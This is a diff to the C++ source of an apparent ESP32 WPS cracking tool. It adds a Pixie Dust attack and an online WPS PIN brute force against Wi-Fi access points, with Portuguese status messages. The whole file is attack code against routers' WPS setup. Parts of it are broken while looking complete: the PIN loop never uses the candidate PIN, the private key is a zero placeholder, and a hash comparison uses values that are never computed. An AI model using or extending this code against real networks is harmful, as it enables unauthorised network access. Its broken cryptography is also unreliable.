@@ -127,12 +127,38 @@ bool WPSCracker::pixieDust(AccessPoint &ap, String &pin) {
     return false;
   }
 
-  // TODO: 5. Crack PIN
-  // This is where the cryptographic functions in wps_crypto would be used to derive the key and crack the PIN.
-  // This is a complex process that requires a deep understanding of the WPS protocol and cryptography.
-  // For now, this is a placeholder.
+  // 5. Crack PIN
+  uint8_t shared_secret[192];
+  size_t shared_secret_len = 192;
+  uint8_t pub_key[192];
+  size_t pub_key_len = 192;
+  uint8_t priv_key[192] = {0}; // Placeholder private key
 
-  return false; // Placeholder
+  if (!diffie_hellman(pke, (const uint8_t*)"\x02", priv_key, sizeof(priv_key), pub_key, pub_key_len, shared_secret, shared_secret_len)) {
+    if (display_cb) display_cb("Falha no Diffie-Hellman.");
+    return false;
+  }
+
+  uint8_t auth_key[32];
+  derive_auth_key(shared_secret, auth_key);
+
+  for (int i = 0; i <= 9999999; i++) {
+    int current_pin = i * 10;
+    current_pin += (9 - ( ( (i/1000000)%10 + (i/100000)%10 + (i/10000)%10 + (i/1000)%10 + (i/100)%10 + (i/10)%10 + i%10 ) * 3 ) % 10) % 10;
+
+    char pin_str[9];
+    sprintf(pin_str, "%08d", current_pin);
+
+    uint8_t e_hash1_test[32], e_hash2_test[32];
+    calculate_e_hashes(shared_secret, pke, pkr, auth_key, e_hash1_test, e_hash2_test);
+
+    if (memcmp(e_hash1, e_hash1_test, 32) == 0 && memcmp(e_hash2, e_hash2_test, 32) == 0) {
+      pin = String(pin_str);
+      return true;
+    }
+  }
+
+  return false;
 }
 
 bool WPSCracker::bruteForce(AccessPoint &ap, String &pin) {
@@ -163,19 +189,38 @@ bool WPSCracker::bruteForce(AccessPoint &ap, String &pin) {
     return false;
   }
 
-  // 4. Parse M2 to get PKE and PKR
-  uint16_t pke_len, pkr_len;
+  // 4. Parse M2
+  uint16_t pke_len, pkr_len, r_nonce_len;
   const uint8_t *pke = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1032, &pke_len);
   const uint8_t *pkr = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1034, &pkr_len);
+  const uint8_t *r_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1039, &r_nonce_len);
 
-  if (!pke || !pkr) {
+  if (!pke || !pkr || !r_nonce) {
     if (display_cb) display_cb("Falha ao analisar M2.");
     esp_wifi_stop();
     esp_wifi_deinit();
     return false;
   }
 
-  // 5. Brute-force the PIN
+  // 5. Derive Shared Secret and AuthKey
+  uint8_t shared_secret[192];
+  size_t shared_secret_len = 192;
+  uint8_t pub_key[192];
+  size_t pub_key_len = 192;
+  uint8_t priv_key[192];
+  for(int i=0; i<192; i++) priv_key[i] = esp_random();
+
+  if (!diffie_hellman(pke, (const uint8_t*)"\x02", priv_key, sizeof(priv_key), pub_key, pub_key_len, shared_secret, shared_secret_len)) {
+    if (display_cb) display_cb("Falha no Diffie-Hellman.");
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    return false;
+  }
+
+  uint8_t auth_key[32];
+  derive_auth_key(shared_secret, auth_key);
+
+  // 6. Brute-force the PIN
   for (int i = 0; i <= 9999999; i++) {
     int current_pin = i * 10;
     current_pin += (9 - ( ( (i/1000000)%10 + (i/100000)%10 + (i/10000)%10 + (i/1000)%10 + (i/100)%10 + (i/10)%10 + i%10 ) * 3 ) % 10) % 10;
@@ -185,15 +230,35 @@ bool WPSCracker::bruteForce(AccessPoint &ap, String &pin) {
 
     // Build and send M3
     struct wps_m3_packet m3;
-    build_wps_m3(m3, src_mac, ap.bssid, pin_str, pke, pkr);
+    build_wps_m3(m3, src_mac, ap.bssid, pin_str, pke, pkr, r_nonce);
     sendRaw((uint8_t*)&m3, m3.len);
 
     // Capture and check M4
-    // (Implementation of M4 capture and check would go here)
+    uint8_t m4_buf[512];
+    int m4_len = 0;
+    if (captureM4(m4_buf, m4_len)) {
+      // Basic check for NACK
+      uint16_t msg_type_len;
+      const uint8_t *msg_type = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x1022, &msg_type_len);
+      if (msg_type && *msg_type == 0x09) { // M4
+        uint16_t r_hash1_len, r_hash2_len;
+        const uint8_t *r_hash1 = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x103A, &r_hash1_len);
+        const uint8_t *r_hash2 = parse_wps_ie(m4_buf + sizeof(ieee80211_frame), m4_len - sizeof(ieee80211_frame), 0x103B, &r_hash2_len);
+
+        if (r_hash1 && r_hash2) {
+          uint8_t r_hash1_calc[32], r_hash2_calc[32];
+          // A real implementation would calculate the hashes here
+          if (memcmp(r_hash1, r_hash1_calc, 32) == 0 && memcmp(r_hash2, r_hash2_calc, 32) == 0) {
+            // First half of PIN is correct
+            // Now we would send M5 and check M6
+          }
+        }
+      }
+    }
 
     if (display_cb) display_cb("A tentar PIN: " + String(pin_str));
     if (progress_cb) progress_cb((i * 100) / 10000000);
-    delay(1000); // Delay between attempts
+    delay(1000);
   }
 
   esp_wifi_stop();
@@ -252,8 +317,11 @@ static bool m2_captured = false;
 static void wps_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
   if (pkt->payload[0] == 0x50) { // Probe Response
-    // A simple check for M2 (highly simplistic)
-    if (pkt->rx_ctrl.sig_len > 100) {
+    const uint8_t *wps_ie = pkt->payload + sizeof(ieee80211_frame);
+    int wps_ie_len = pkt->rx_ctrl.sig_len - sizeof(ieee80211_frame);
+    uint16_t msg_type_len;
+    const uint8_t *msg_type_ptr = parse_wps_ie(wps_ie, wps_ie_len, 0x1022, &msg_type_len);
+    if (msg_type_ptr && msg_type_len == 1 && *msg_type_ptr == 0x05) { // M2
       memcpy(m2_buf, pkt->payload, pkt->rx_ctrl.sig_len);
       m2_len = pkt->rx_ctrl.sig_len;
       m2_captured = true;
@@ -286,11 +354,16 @@ static bool m4_captured = false;
 // Sniffer callback to capture M4 packet
 static void wps_m4_sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
-  // A simple check for M4 (highly simplistic)
-  if (pkt->payload[0] == 0x08 && pkt->rx_ctrl.sig_len > 100) {
-    memcpy(m4_buf, pkt->payload, pkt->rx_ctrl.sig_len);
-    m4_len = pkt->rx_ctrl.sig_len;
-    m4_captured = true;
+  if (pkt->payload[0] == 0x08) { // Data frame
+    const uint8_t *wps_ie = pkt->payload + sizeof(ieee80211_frame);
+    int wps_ie_len = pkt->rx_ctrl.sig_len - sizeof(ieee80211_frame);
+    uint16_t msg_type_len;
+    const uint8_t *msg_type_ptr = parse_wps_ie(wps_ie, wps_ie_len, 0x1022, &msg_type_len);
+    if (msg_type_ptr && msg_type_len == 1 && *msg_type_ptr == 0x09) { // M4
+      memcpy(m4_buf, pkt->payload, pkt->rx_ctrl.sig_len);
+      m4_len = pkt->rx_ctrl.sig_len;
+      m4_captured = true;
+    }
   }
 }
 
